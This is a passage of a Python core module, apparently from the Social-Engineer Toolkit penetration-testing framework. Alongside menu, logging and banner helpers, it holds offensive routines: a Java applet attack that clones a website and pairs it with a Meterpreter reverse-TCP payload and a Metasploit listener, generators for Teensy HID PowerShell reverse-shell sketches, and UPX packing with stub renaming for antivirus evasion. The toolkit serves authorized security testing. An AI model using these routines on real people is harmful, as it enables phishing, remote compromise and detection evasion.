#!/usr/bin/env python
#
# Centralized core modules for SET
#
#
import re
import sys
import socket
import subprocess
import shutil
import os
import time
import datetime
import random
import string
import inspect
import base64
from src.core import dictionaries
import src.core.minifakedns
import io
import trace

# python 2 and 3 compatibility
try:
    from urllib.request import urlopen
except ImportError:
    from urllib import urlopen
import multiprocessing

if sys.version_info >= (3, 0):
    # python 3 removes reduce from builtin and into functools
    from functools import *

# needed for backwards compatibility of python2 vs 3 - need to convert to
# threading eventually
try:
    import thread
except ImportError:
    import _thread as thread

try:
    raw_input
except:
    raw_input = input

# check to see if we have python-pycrypto
try:
    from Crypto.Cipher import AES

except ImportError:

    print(
        "[!] The python-pycrypto python module not installed. You will lose the ability for encrypted communications.")
    pass

# get the main SET path


def definepath():
    if check_os() == "posix":
        if os.path.isfile("setoolkit"):
            return os.getcwd()
        else:
            return "/usr/share/setoolkit/"

    else:
        return os.getcwd()

# check operating system


def check_os():
    if os.name == "nt":
        operating_system = "windows"
    if os.name == "posix":
        operating_system = "posix"
    return operating_system

#
# Class for colors
#
if check_os() == "posix":
    class bcolors:
        PURPLE = '\033[95m'
        CYAN = '\033[96m'
        DARKCYAN = '\033[36m'
        BLUE = '\033[94m'
        GREEN = '\033[92m'
        YELLOW = '\033[93m'
        RED = '\033[91m'
        BOLD = '\033[1m'
        UNDERL = '\033[4m'
        ENDC = '\033[0m'
        backBlack = '\033[40m'
        backRed = '\033[41m'
        backGreen = '\033[42m'
        backYellow = '\033[43m'
        backBlue = '\033[44m'
        backMagenta = '\033[45m'
        backCyan = '\033[46m'
        backWhite = '\033[47m'

        def disable(self):
            self.PURPLE = ''
            self.CYAN = ''
            self.BLUE = ''
            self.GREEN = ''
            self.YELLOW = ''
            self.RED = ''
            self.ENDC = ''
            self.BOLD = ''
            self.UNDERL = ''
            self.backBlack = ''
            self.backRed = ''
            self.backGreen = ''
            self.backYellow = ''
            self.backBlue = ''
            self.backMagenta = ''
            self.backCyan = ''
            self.backWhite = ''
            self.DARKCYAN = ''

# if we are windows or something like that then define colors as nothing
else:
    class bcolors:
        PURPLE = ''
        CYAN = ''
        DARKCYAN = ''
        BLUE = ''
        GREEN = ''
        YELLOW = ''
        RED = ''
        BOLD = ''
        UNDERL = ''
        ENDC = ''
        backBlack = ''
        backRed = ''
        backGreen = ''
        backYellow = ''
        backBlue = ''
        backMagenta = ''
        backCyan = ''
        backWhite = ''

        def disable(self):
            self.PURPLE = ''
            self.CYAN = ''
            self.BLUE = ''
            self.GREEN = ''
            self.YELLOW = ''
            self.RED = ''
            self.ENDC = ''
            self.BOLD = ''
            self.UNDERL = ''
            self.backBlack = ''
            self.backRed = ''
            self.backGreen = ''
            self.backYellow = ''
            self.backBlue = ''
            self.backMagenta = ''
            self.backCyan = ''
            self.backWhite = ''
            self.DARKCYAN = ''

# this will be the home for the set menus


def setprompt(category, text):
    # if no special prompt and no text, return plain prompt
    if category == '0' and text == "":
        return bcolors.UNDERL + bcolors.DARKCYAN + "set" + bcolors.ENDC + "> "
    # if the loop is here, either category or text was positive
    # if it's the category that is blank...return prompt with only the text
    if category == '0':
        return bcolors.UNDERL + bcolors.DARKCYAN + "set" + bcolors.ENDC + "> " + text + ": "
    # category is NOT blank
    else:
        # initialize the base 'set' prompt
        prompt = bcolors.UNDERL + bcolors.DARKCYAN + "set" + bcolors.ENDC
        # if there is a category but no text
        if text == "":
            for level in category:
                level = dictionaries.category(level)
                prompt += ":" + bcolors.UNDERL + \
                    bcolors.DARKCYAN + level + bcolors.ENDC
            promptstring = str(prompt)
            promptstring += ">"
            return promptstring
        # if there is both a category AND text
        else:
            # iterate through the list received
            for level in category:
                level = dictionaries.category(level)
                prompt += ":" + bcolors.UNDERL + \
                    bcolors.DARKCYAN + level + bcolors.ENDC
            promptstring = str(prompt)
            promptstring = promptstring + "> " + text + ":"
            return promptstring


def yesno_prompt(category, text):
    valid_response = False
    while not valid_response:
        response = raw_input(setprompt(category, text))
        response = str.lower(response)
        if response == "no" or response == "n":
            response = "NO"
            valid_response = True
        elif response == "yes" or response == "y":
            response = "YES"
            valid_response = True
        else:
            print_warning("valid responses are 'n|y|N|Y|no|yes|No|Yes|NO|YES'")
    return response


def return_continue():
    print(("\n      Press " + bcolors.RED +
           "<return> " + bcolors.ENDC + "to continue"))
    pause = raw_input()

# DEBUGGING #############
# ALWAYS SET TO ZERO BEFORE COMMIT!
DEBUG_LEVEL = 0
#  0 = Debugging OFF
#  1 = debug imports only
#  2 = debug imports with pause for <ENTER>
#  3 = imports, info messages
#  4 = imports, info messages with pause for <ENTER>
#  5 = imports, info messages, menus
#  6 = imports, info messages, menus with pause for <ENTER>

debugFrameString = '-' * 72


def debug_msg(currentModule, message, msgType):
    if DEBUG_LEVEL == 0:
        pass  # stop evaluation efficiently
    else:
        if msgType <= DEBUG_LEVEL:
            # a bit more streamlined
            print(bcolors.RED + "\nDEBUG_MSG: from module '" +
                  currentModule + "': " + message + bcolors.ENDC)

            if DEBUG_LEVEL == 2 or DEBUG_LEVEL == 4 or DEBUG_LEVEL == 6:
                raw_input("waiting for <ENTER>\n")


def mod_name():
    frame_records = inspect.stack()[1]
    calling_module = inspect.getmodulename(frame_records[1])
    return calling_module

#
# RUNTIME MESSAGES ############


def print_status(message):
    print(bcolors.GREEN + bcolors.BOLD + "[*] " + bcolors.ENDC + str(message))


def print_info(message):
    print(bcolors.BLUE + bcolors.BOLD + "[-] " + bcolors.ENDC + str(message))


def print_info_spaces(message):
    print(bcolors.BLUE + bcolors.BOLD + "  [-] " + bcolors.ENDC + str(message))


def print_warning(message):
    print(bcolors.YELLOW + bcolors.BOLD + "[!] " + bcolors.ENDC + str(message))


def print_error(message):
    print(bcolors.RED + bcolors.BOLD +
          "[!] " + bcolors.ENDC + bcolors.RED + str(message) + bcolors.ENDC)


def get_version():
    define_version = open("src/core/set.version", "r").read().rstrip()
    # define_version = '7.2.3'
    return define_version


class create_menu:

    def __init__(self, text, menu):
        self.text = text
        self.menu = menu
        print(text)
        for i, option in enumerate(menu):

            menunum = i + 1
            # Check to see if this line has the 'return to main menu' code
            match = re.search("0D", option)
            # If it's not the return to menu line:
            if not match:
                if menunum < 10:
                    print(('   %s) %s' % (menunum, option)))
                else:
                    print(('  %s) %s' % (menunum, option)))
            else:
                print('\n  99) Return to Main Menu\n')
        return


def detect_public_ip():
    """
    Helper function to auto-detect our public IP(v4) address.
    """
    rhost = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    rhost.connect(('google.com', 0))
    rhost.settimeout(2)
    return rhost.getsockname()[0]

def validate_ip(address):
    """
    Validates that a given string is an IPv4 dotted quad.
    """
    try:
        if socket.inet_aton(address):
            if len(address.split('.')) == 4:
                debug_msg("setcore", "this is a valid IP address", 5)
                return True
            else:
                print_error("This is not a valid IP address...")
                raise socket.error

        else:
            raise socket_error

    except socket.error:
        return False

#
# grab the metaspoit path
#


def meta_path():

    # DEFINE METASPLOIT PATH
    trigger = 0
    try:

        # pull from config first
        msf_path = check_config("METASPLOIT_PATH=")
        if not msf_path.endswith("/"):
            msf_path = msf_path + "/"
        if os.path.isfile(msf_path + "msfconsole"):
            trigger = 1

        # if we are using just the standard path for msfconsole
        if os.path.isfile("/usr/bin/msfconsole"):
            if trigger == 0:
                msf_path = "/usr/bin/"
                trigger = 1

        # specific for backbox linux
        if os.path.isfile("/opt/metasploit-framework/msfconsole"):
            if trigger == 0:
                msf_path = "/opt/metasploit-framework/"
                trigger = 1

        # specific for kali linux
        if os.path.isfile("/opt/metasploit/apps/pro/msf3/msfconsole"):
            # left blank since you can call launcher and ruby1.9 - 2x issues
            # are there
            if trigger == 0:
                msf_path = ""
                trigger = 1

        # specific for backtrack5 and other backtrack versions
        if os.path.isfile("/opt/framework3/msf3/msfconsole"):
            if trigger == 0:
                msf_path = "/opt/framework3/msf3/"
                trigger = 1
        if os.path.isfile("/opt/framework/msf3/msfconsole"):
            if trigger == 0:
                msf_path = "/opt/framework/msf3/"
                trigger = 1
        if os.path.isfile("/opt/metasploit/msf3/msfconsole"):
            if trigger == 0:
                msf_path = "/opt/metasploit/msf3/"
                trigger = 1

        # specific for pwnpad and pwnplug (pwnie express)
        if os.path.isfile("/opt/metasploit-framework/msfconsole"):
            if trigger == 0:
                msf_path = "/opt/metasploit-framework/"
                trigger = 1

        # specific for pentesters framework github.com/trustedsec/ptf
        if os.path.isfile("/pentest/exploitation/metasploit/msfconsole"):
            if trigger == 0:
                msf_path = "/pentest/exploitation/metasploit/"
                trigger = 1

        # Kali linux bleeding edge should return this in order to work
        if os.path.isfile("/usr/share/metasploit-framework/msfconsole"):
            if trigger == 0:
                msf_path = "/usr/share/metasploit-framework/"
                trigger = 1

        # if we didn't find anything
        if trigger == 0:
            print_error(
                "Metasploit path not found. These payloads will be disabled.")
            print_error(
                "Please configure Metasploit's path in the /etc/setoolkit/set.config file.")
            msf_path = False

    except Exception as e:
        print_status("Something went wrong. Printing error: " + str(e))

    # this is an option if we don't want to use Metasploit period
    check_metasploit = check_config("METASPLOIT_MODE=").lower()
    if check_metasploit != "on":
        msf_path = False
    return msf_path

#
# grab the metaspoit path
#


def meta_database():
    # DEFINE METASPLOIT PATH
    meta_path = open("/etc/setoolkit/set.config", "r").readlines()
    for line in meta_path:
        line = line.rstrip()
        match = re.search("METASPLOIT_DATABASE=", line)
        if match:
            line = line.replace("METASPLOIT_DATABASE=", "")
            msf_database = line.rstrip()
            return msf_database


#
# grab the interface ip address
#
def grab_ipaddress():
    try:
        revipaddr = detect_public_ip()
        rhost = raw_input(setprompt("0", "IP address or URL (www.ex.com) for the payload listener (LHOST) [" + revipaddr + "]"))
        if rhost == "": rhost = revipaddr

    except Exception:
        rhost = raw_input(setprompt("0", "Enter your interface/reverse listener IP Address or URL"))

    if validate_ip(rhost) == False:
        while 1:
            choice = raw_input(setprompt(["2"], "This is not an IP address. Are you using a hostname? [y/n] "))
            if choice == "" or choice.lower() == "y":
                print_status("Roger that ghostrider. Using hostnames moving forward (hostnames are 1337, nice job)..")
                break
            else:
                rhost = raw_input(setprompt(["2"], "IP address for the reverse connection [" + rhost + "]"))
                if validate_ip(rhost) == True: break
                else:
                    choice = raw_input(setprompt(["2"], "This is not an IP address. Are you using a hostname? [y/n] "))
                    if choice == "" or choice.lower() == "y":
                        print_status("Roger that ghostrider. Using hostnames moving forward (hostnames are 1337, nice job)..")
                        break

    # rhost return when verified
    return rhost

#
# cleanup old or stale files
#
def cleanup_routine():
    try:
        # restore original Java Applet
        shutil.copyfile("%s/src/html/Signed_Update.jar.orig" %
                        (definepath()), userconfigpath + "Signed_Update.jar")
        if os.path.isfile("newcert.pem"):
            os.remove("newcert.pem")
        if os.path.isfile(userconfigpath + "interfaces"):
            os.remove(userconfigpath + "interfaces")
        if os.path.isfile("src/html/1msf.raw"):
            os.remove("src/html/1msf.raw")
        if os.path.isfile("src/html/2msf.raw"):
            os.remove("src/html/2msf.raw")
        if os.path.isfile("msf.exe"):
            os.remove("msf.exe")
        if os.path.isfile("src/html/index.html"):
            os.remove("src/html/index.html")
        if os.path.isfile(userconfigpath + "Signed_Update.jar"):
            os.remove(userconfigpath + "Signed_Update.jar")
        if os.path.isfile(userconfigpath + "version.lock"):
            os.remove(userconfigpath + "version.lock")
        src.core.minifakedns.stop_dns_server()
    except:
        pass

#
# Update The Social-Engineer Toolkit
#


def update_set():
    backbox = check_backbox()
    kali = check_kali()

    if backbox == "BackBox":
        print_status(
            "You are running BackBox Linux which already implements SET updates.")
        print_status(
            "No need for further operations, just update your system.")
        time.sleep(2)

    elif kali == "Kali":
        print_status("You are running Kali Linux which maintains SET updates.")
        time.sleep(2)

    # if we aren't running Kali or BackBox :(
    else:
        print_info("Kali or BackBox Linux not detected, manually updating..")
        print_info("Updating the Social-Engineer Toolkit, be patient...")
        print_info("Performing cleanup first...")
        subprocess.Popen("git clean -fd", shell=True).wait()
        print_info("Updating... This could take a little bit...")
        subprocess.Popen("git pull", shell=True).wait()
        print_status("The updating has finished, returning to main menu..")
        time.sleep(2)

#
# Pull the help menu here
#


def help_menu():
    fileopen = open("README.md", "r").readlines()
    for line in fileopen:
        line = line.rstrip()
        print(line)
    fileopen = open("readme/CREDITS", "r").readlines()
    print("\n")
    for line in fileopen:
        line = line.rstrip()
        print(line)
    return_continue()


#
# This is a small area to generate the date and time
#
def date_time():
    now = str(datetime.datetime.today())
    return now

#
# generate a random string
#


def generate_random_string(low, high):
    length = random.randint(low, high)
    letters = string.ascii_letters # + string.digits
    return ''.join([random.choice(letters) for _ in range(length)])

#
# clone JUST a website, and export it.
# Will do no additional attacks.
#


def site_cloner(website, exportpath, *args):
    grab_ipaddress()
    ipaddr = grab_ipaddress()
    filewrite = open(userconfigpath + "interface", "w")
    filewrite.write(ipaddr)
    filewrite.close()
    filewrite = open(userconfigpath + "ipaddr", "w")
    filewrite.write(ipaddr)
    filewrite.close()
    filewrite = open(userconfigpath + "site.template", "w")
    filewrite.write("URL=" + website)
    filewrite.close()
    # if we specify a second argument this means we want to use java applet
    if args[0] == "java":
        # needed to define attack vector
        filewrite = open(userconfigpath + "attack_vector", "w")
        filewrite.write("java")
        filewrite.close()
    sys.path.append("src/webattack/web_clone")
    # if we are using menu mode we reload just in case
    try:
        debug_msg("setcore", "importing 'src.webattack.web_clone.cloner'", 1)
        module_reload(cloner)

    except:
        debug_msg("setcore", "importing 'src.webattack.web_clone.cloner'", 1)
        import cloner

    # copy the file to a new folder
    print_status("Site has been successfully cloned and is: " + exportpath)
    subprocess.Popen("mkdir '%s';cp %s/web_clone/* '%s'" % (exportpath, userconfigpath,
                                                            exportpath), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()


#
# This will start a web server in the directory root you specify, so for example
# you clone a website then run it in that web server, it will pull any index.html file
#
def start_web_server(directory):
    try:
        # import the threading, socketserver, and simplehttpserver
        import socketserver
        import http.server
        # create the httpd handler for the simplehttpserver
        # we set the allow_reuse_address incase something hangs can still bind
        # to port

        class ReusableTCPServer(socketserver.TCPServer):
            allow_reuse_address = True
        # specify the httpd service on 0.0.0.0 (all interfaces) on port 80
        httpd = ReusableTCPServer(
            ("0.0.0.0", 80), http.server.SimpleHTTPRequestHandler)
        # thread this mofo
        os.chdir(directory)
        thread.start_new_thread(httpd.serve_forever, ())

    # handle keyboard interrupts
    except KeyboardInterrupt:
        print_info("Exiting the SET web server...")
        httpd.socket.close()

#
# this will start a web server without threads
#


def start_web_server_unthreaded(directory):
    try:
        # import the threading, socketserver, and simplehttpserver
        import thread
        import socketserver
        import http.server
        # create the httpd handler for the simplehttpserver
        # we set the allow_reuse_address incase something hangs can still bind
        # to port

        class ReusableTCPServer(socketserver.TCPServer):
            allow_reuse_address = True
        # specify the httpd service on 0.0.0.0 (all interfaces) on port 80
        httpd = ReusableTCPServer(
            ("0.0.0.0", 80), http.server.SimpleHTTPRequestHandler)
        # thread this mofo
        os.chdir(directory)
        httpd.serve_forever()
        # change directory to the path we specify for output path
        os.chdir(directory)
        # handle keyboard interrupts

    except KeyboardInterrupt:
        print_info("Exiting the SET web server...")
        httpd.socket.close()


#
# This will create the java applet attack from start to finish.
# Includes payload (reverse_meterpreter for now) cloning website
# and additional capabilities.
#
def java_applet_attack(website, port, directory):
    # create the payload
    meterpreter_reverse_tcp_exe(port)
    # clone the website and inject java applet
    site_cloner(website, directory, "java")

    # this part is needed to rename the msf.exe file to a randomly generated
    # one
    filename = check_options("MSF.EXE=")
    if check_options != 0:

        # move the file to the specified directory and filename
        subprocess.Popen("cp %s/msf.exe %s/%s" % (userconfigpath, directory, filename),
                         stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()

    applet_name = check_options("APPLET_NAME=")
    if applet_name == "":
        applet_name = generate_random_string(6, 15) + ".jar"

    # lastly we need to copy over the signed applet
    subprocess.Popen(
        "cp %s/Signed_Update.jar %s/%s" % (userconfigpath, directory, applet_name),
                     stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()

    # start the web server by running it in the background
    start_web_server(directory)

    # run multi handler for metasploit
    print_info("Starting the multi/handler through Metasploit...")
    metasploit_listener_start("windows/meterpreter/reverse_tcp", port)

#
# this will create a raw PDE file for you to use in your teensy device
#
#


def teensy_pde_generator(attack_method):

    # grab the ipaddress
    ipaddr = grab_ipaddress()

    # if we are doing the attack vector teensy beef
    if attack_method == "beef":
        # specify the filename
        filename = open("src/teensy/beef.ino", "r")
        filewrite = open(userconfigpath + "reports/beef.ino", "w")
        teensy_string = (
            "Successfully generated Teensy HID Beef Attack Vector under %s/reports/beef.ino" % (userconfigpath))

    # if we are doing the attack vector teensy beef
    if attack_method == "powershell_down":
        # specify the filename
        filename = open("src/teensy/powershell_down.ino", "r")
        filewrite = open(userconfigpath + "reports/powershell_down.ino", "w")
        teensy_string = (
            "Successfully generated Teensy HID Attack Vector under %s/reports/powershell_down.ino" % (userconfigpath))

    # if we are doing the attack vector teensy
    if attack_method == "powershell_reverse":
        # specify the filename
        filename = open("src/teensy/powershell_reverse.ino", "r")
        filewrite = open(userconfigpath + "reports/powershell_reverse.ino", "w")
        teensy_string = (
            "Successfully generated Teensy HID Attack Vector under %s/reports/powershell_reverse.ino" % (userconfigpath))

    # if we are doing the attack vector teensy beef
    if attack_method == "java_applet":
        # specify the filename
        filename = open("src/teensy/java_applet.ino", "r")
        filewrite = open(userconfigpath + "reports/java_applet.ino", "w")
        teensy_string = (
            "Successfully generated Teensy HID Attack Vector under %s/reports/java_applet.ino" % (userconfigpath))

    # if we are doing the attack vector teensy
    if attack_method == "wscript":
        # specify the filename
        filename = open("src/teensy/wscript.ino", "r")
        filewrite = open(userconfigpath + "reports/wscript.ino", "w")
        teensy_string = (
            "Successfully generated Teensy HID Attack Vector under %s/reports/wscript.ino" % (userconfigpath))

    # All the options share this code except binary2teensy
    if attack_method != "binary2teensy":
        for line in filename:
            line = line.rstrip()
            match = re.search("IPADDR", line)
            if match:
                line = line.replace("IPADDR", ipaddr)
            filewrite.write(line)

    # binary2teensy method
    if attack_method == "binary2teensy":
        # specify the filename
        import src.teensy.binary2teensy
        teensy_string = (
            "Successfully generated Teensy HID Attack Vector under %s/reports/binary2teensy.ino" % (userconfigpath))

    print_status(teensy_string)
#
# Expand the filesystem windows directory
#


def windows_root():
    return os.environ['WINDIR']

#
# core log file routine for SET
#


def log(error):
    try:
        # open log file only if directory is present (may be out of directory
        # for some reason)
        if not os.path.isfile("%s/src/logs/set_logfile.log" % (definepath())):
            filewrite = open("%s/src/logs/set_logfile.log" %
                             (definepath()), "w")
            filewrite.write("")
            filewrite.close()
        if os.path.isfile("%s/src/logs/set_logfile.log" % (definepath())):
            error = str(error)
            # open file for writing
            filewrite = open("%s/src/logs/set_logfile.log" %
                             (definepath()), "a")
            # write error message out
            filewrite.write("ERROR: " + date_time() + ": " + error + "\n")
            # close the file
            filewrite.close()
    except IOError as err:
        pass
#
# upx encoding and modify binary
#


def upx(path_to_file):
    # open the set_config
    fileopen = open("/etc/setoolkit/set.config", "r")
    for line in fileopen:
        line = line.rstrip()
        match = re.search("UPX_PATH=", line)
        if match:
            upx_path = line.replace("UPX_PATH=", "")

    # if it isn't there then bomb out
    if not os.path.isfile(upx_path):
        print_warning(
            "UPX was not detected. Try configuring the set_config again.")

    # if we detect it
    if os.path.isfile(upx_path):
        print_info(
            "Packing the executable and obfuscating PE file randomly, one moment.")
        # packing executable
        subprocess.Popen(
            "%s -9 -q -o %s/temp.binary %s" % (upx_path, userconfigpath, path_to_file),
                         stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
        # move it over the old file
        subprocess.Popen("mv %s/temp.binary %s" % (userconfigpath, path_to_file),
                         stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()

        # random string
        random_string = generate_random_string(3, 3).upper()

        # 4 upx replace - we replace 4 upx open the file
        fileopen = open(path_to_file, "rb")
        filewrite = open(userconfigpath + "temp.binary", "wb")

        # read the file open for data
        data = fileopen.read()
        # replace UPX stub makes better evasion for A/V
        filewrite.write(data.replace("UPX", random_string, 4))
        filewrite.close()
        # copy the file over
        subprocess.Popen("mv %s/temp.binary %s" % (userconfigpath, path_to_file),
                         stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
    time.sleep(3)


def show_banner(define_version, graphic):

    if graphic == "1":
        if check_os() == "posix":
            os.system("clear")
        if check_os() == "windows":
            os.system("cls")
        show_graphic()
    else:
        os.system("clear")

    print(bcolors.BLUE + """
[---]        The Social-Engineer Toolkit (""" + bcolors.YELLOW + """SET""" + bcolors.BLUE + """)         [---]
[---]        Created by:""" + bcolors.RED + """ David Kennedy """ + bcolors.BLUE + """(""" + bcolors.YELLOW + """ReL1K""" + bcolors.BLUE + """)         [---]
                      Version: """ + bcolors.RED + """%s""" % (define_version) + bcolors.BLUE + """
                    Codename: '""" + bcolors.YELLOW + """Maverick""" + bcolors.ENDC + bcolors.BLUE + """'
[---]        Follow us on Twitter: """ + bcolors.PURPLE + """@TrustedSec""" + bcolors.BLUE + """         [---]
[---]        Follow me on Twitter: """ + bcolors.PURPLE + """@HackingDave""" + bcolors.BLUE + """        [---]
[---]       Homepage: """ + bcolors.YELLOW + """https://www.trustedsec.com""" + bcolors.BLUE + """       [---]
""" + bcolors.GREEN + """        Welcome to the Social-Engineer Toolkit (SET).
         The one stop shop for all of your SE needs.
""")
    print(bcolors.BOLD + """   The Social-Engineer Toolkit is a product of TrustedSec.\n\n           Visit: """ +
          bcolors.GREEN + """https://www.trustedsec.com\n""" + bcolors.ENDC)
    print(bcolors.BLUE + """   It's easy to update using the PenTesters Framework! (PTF)\nVisit """ + bcolors.YELLOW +
          """https://github.com/trustedsec/ptf""" + bcolors.BLUE + """ to update all your tools!\n\n""" + bcolors.ENDC)

    # here we check if  there is a new version of SET - if there is, then
    # display a banner
    cv = get_version()

    # pull version
    try:
        version = ""

        def pull_version():
            if not os.path.isfile(userconfigpath + "version.lock"):
                try:

                    url = (
                        'https://raw.githubusercontent.com/trustedsec/social-engineer-toolkit/master/src/core/set.version')
                    version = urlopen(url).read().rstrip().decode('utf-8')
                    filewrite = open(userconfigpath + "version.lock", "w")
                    filewrite.write(version)
                    filewrite.close()

                except KeyboardInterrupt:
                    version = "keyboard interrupt"

            else:
                version = open(userconfigpath + "version.lock", "r").read()

            if cv != version:
                if version != "":
                    print(bcolors.RED + "          There is a new version of SET available.\n                    " + bcolors.GREEN + " Your version: " + bcolors.RED + cv + bcolors.GREEN +
                          "\n                  Current version: " + bcolors.ENDC + bcolors.BOLD + version + bcolors.YELLOW + "\n\nPlease update SET to the latest before submitting any git issues.\n\n" + bcolors.ENDC)

        # why urllib and sockets cant control DNS resolvers is beyond me - so
        # we use this as a hack job to add a delay and kill if updates are
        # taking too long
        p = multiprocessing.Process(target=pull_version)
        p.start()

        # Wait for 5 seconds or until process finishes
        p.join(8)

        # If thread is still active
        if p.is_alive():
            print(
                bcolors.RED + " Unable to check for new version of SET (is your network up?)\n" + bcolors.ENDC)
            # terminate the process
            p.terminate()
            p.join()

    except Exception as err:
        print(err)
        # pass


def show_graphic():
    menu = random.randrange(2, 15)
    if menu == 2:
        print(bcolors.YELLOW + r"""
                 .--.  .--. .-----.
                : .--': .--'`-. .-'
                `. `. : `;    : :
                 _`, :: :__   : :
                `.__.'`.__.'  :_;   """ + bcolors.ENDC)
        return

    if menu == 3:
        print(bcolors.GREEN + r"""
          _______________________________
         /   _____/\_   _____/\__    ___/
         \_____  \  |    __)_   |    |
         /        \ |        \  |    |
        /_______  //_______  /  |____|
                \/         \/            """ + bcolors.ENDC)
        return

    if menu == 4:
        print(bcolors.BLUE + r"""
            :::===  :::===== :::====
            :::     :::      :::====
             =====  ======     ===
                === ===        ===
            ======  ========   ===
""" + bcolors.ENDC)

    if menu == 5:
        print(bcolors.RED + r"""
           ..######..########.########
           .##....##.##..........##...
           .##.......##..........##...
           ..######..######......##...
           .......##.##..........##...
           .##....##.##..........##...
           ..######..########....##...  """ + bcolors.ENDC)
        return

    if menu == 6:
        print(bcolors.PURPLE + r'''
         .M"""bgd `7MM"""YMM MMP""MM""YMM
        ,MI    "Y   MM    `7 P'   MM   `7
        `MMb.       MM   d        MM
          `YMMNq.   MMmmMM        MM
        .     `MM   MM   Y  ,     MM
        Mb     dM   MM     ,M     MM
        P"Ybmmd"  .JMMmmmmMMM   .JMML.''' + bcolors.ENDC)
        return

    if menu == 7:
        print(bcolors.YELLOW + r"""
              ________________________
              __  ___/__  ____/__  __/
              _____ \__  __/  __  /
              ____/ /_  /___  _  /
              /____/ /_____/  /_/     """ + bcolors.ENDC)
        return

    if menu == 8:
        print(bcolors.RED + r'''
          !\_________________________/!\
          !!                         !! \
          !! Social-Engineer Toolkit !!  \
          !!                         !!  !
          !!          Free           !!  !
          !!                         !!  !
          !!          #hugs          !!  !
          !!                         !!  !
          !!      By: TrustedSec     !!  /
          !!_________________________!! /
          !/_________________________\!/
             __\_________________/__/!_
            !_______________________!/
          ________________________
         /oooo  oooo  oooo  oooo /!
        /ooooooooooooooooooooooo/ /
       /ooooooooooooooooooooooo/ /
      /C=_____________________/_/''' + bcolors.ENDC)

    if menu == 9:
        print(bcolors.YELLOW + """
         01011001011011110111010100100000011100
         10011001010110000101101100011011000111
         10010010000001101000011000010111011001
         10010100100000011101000110111100100000
         01101101011101010110001101101000001000
         00011101000110100101101101011001010010
         00000110111101101110001000000111100101
         10111101110101011100100010000001101000
         01100001011011100110010001110011001000
         00001110100010110100101001001000000101
         01000110100001100001011011100110101101
         11001100100000011001100110111101110010
         00100000011101010111001101101001011011
         10011001110010000001110100011010000110
         01010010000001010011011011110110001101
         10100101100001011011000010110101000101
         01101110011001110110100101101110011001
         01011001010111001000100000010101000110
         11110110111101101100011010110110100101
         11010000100000001010100110100001110101
         011001110111001100101010""" + bcolors.ENDC)

    if menu == 10:
        print(bcolors.GREEN + """
                          .  ..
                       MMMMMNMNMMMM=
                   .DMM.           .MM$
                 .MM.                 MM,.
                 MN.                    MM.
               .M.                       MM
              .M   .....................  NM
              MM   .8888888888888888888.   M7
             .M    88888888888888888888.   ,M
             MM       ..888.MMMMM    .     .M.
             MM         888.MMMMMMMMMMM     M
             MM         888.MMMMMMMMMMM.    M
             MM         888.      NMMMM.   .M
              M.        888.MMMMMMMMMMM.   ZM
              NM.       888.MMMMMMMMMMM    M:
              .M+      .....              MM.
               .MM.                     .MD
                 MM .                  .MM
                  $MM                .MM.
                    ,MM?          .MMM
                       ,MMMMMMMMMMM
                https://www.trustedsec.com""" + bcolors.ENDC)

    if menu == 11:
        print(bcolors.backBlue + r"""
                          _                                           J
                         /-\                                          J
                    _____|#|_____                                     J
                   |_____________|                                    J
                  |_______________|                                   E
                 ||_POLICE_##_BOX_||                                  R
                 | |-|-|-|||-|-|-| |                                  O
                 | |-|-|-|||-|-|-| |                                  N
                 | |_|_|_|||_|_|_| |                                  I
                 | ||~~~| | |---|| |                                  M
                 | ||~~~|!|!| O || |                                  O
                 | ||~~~| |.|___|| |                                  O
                 | ||---| | |---|| |                                  O
                 | ||   | | |   || |                                  O
                 | ||___| | |___|| |                                  !
                 | ||---| | |---|| |                                  !
                 | ||   | | |   || |                                  !
                 | ||___| | |___|| |                                  !
                 |-----------------|                                  !
                 |   Timey Wimey   |                                  !
                 -------------------                                  !""" + bcolors.ENDC)

    if menu == 12:
        print(bcolors.YELLOW + r'''
           ,..-,
         ,;;f^^"""-._
        ;;'          `-.
       ;/               `.
       ||  _______________\_______________________
       ||  |HHHHHHHHHHPo"~~\"o?HHHHHHHHHHHHHHHHHHH|
       ||  |HHHHHHHHHP-._   \,'?HHHHHHHHHHHHHHHHHH|
        |  |HP;""?HH|    """ |_.|HHP^^HHHHHHHHHHHH|
        |  |HHHb. ?H|___..--"|  |HP ,dHHHPo'|HHHHH|
        `| |HHHHHb.?Hb    .--J-dHP,dHHPo'_.rdHHHHH|
         \ |HHHi.`;;.H`-./__/-'H_,--'/;rdHHHHHHHHH|
           |HHHboo.\ `|"\"/"\" '/\ .'dHHHHHHHHHHHH|
           |HHHHHHb`-|.  \|  \ / \/ dHHHHHHHHHHHHH|
           |HHHHHHHHb| \ |\   |\ |`|HHHHHHHHHHHHHH|
           |HHHHHHHHHb  \| \  | \| |HHHHHHHHHHHHHH|
           |HHHHHHHHHHb |\  \|  |\|HHHHHHHHHHHHHHH|
           |HHHHHHHHHHHb| \  |  / dHHHHHHHHHHHHHHH|
           |HHHHHHHHHHHHb  \/ \/ .fHHHHHHHHHHHHHHH|
           |HHHHHHHHHHHHH| /\ /\ |HHHHHHHHHHHHHHHH|
           |""""""""""""""""""""""""""""""""""""""|
           |,;=====.     ,-.  =.       ,=,,=====. |
           |||     '    //"\\   \\   //  ||     ' |
           |||         ,/' `\.  `\. ,/'  ``=====. |
           |||     .   //"""\\   \\_//    .     |||
           |`;=====' =''     ``=  `-'     `=====''|
           |______________________________________|
	''')

    if menu == 13:
        print(bcolors.RED + r"""
                      ..:::::::::..
                  ..:::aad8888888baa:::..
              .::::d:?88888888888?::8b::::.
            .:::d8888:?88888888??a888888b:::.
          .:::d8888888a8888888aa8888888888b:::.
         ::::dP::::::::88888888888::::::::Yb::::
        ::::dP:::::::::Y888888888P:::::::::Yb::::
       ::::d8:::::::::::Y8888888P:::::::::::8b::::
      .::::88::::::::::::Y88888P::::::::::::88::::.
      :::::Y8baaaaaaaaaa88P:T:Y88aaaaaaaaaad8P:::::
      :::::::Y88888888888P::|::Y88888888888P:::::::
      ::::::::::::::::888:::|:::888::::::::::::::::
      `:::::::::::::::8888888888888b::::::::::::::'
       :::::::::::::::88888888888888::::::::::::::
        :::::::::::::d88888888888888:::::::::::::
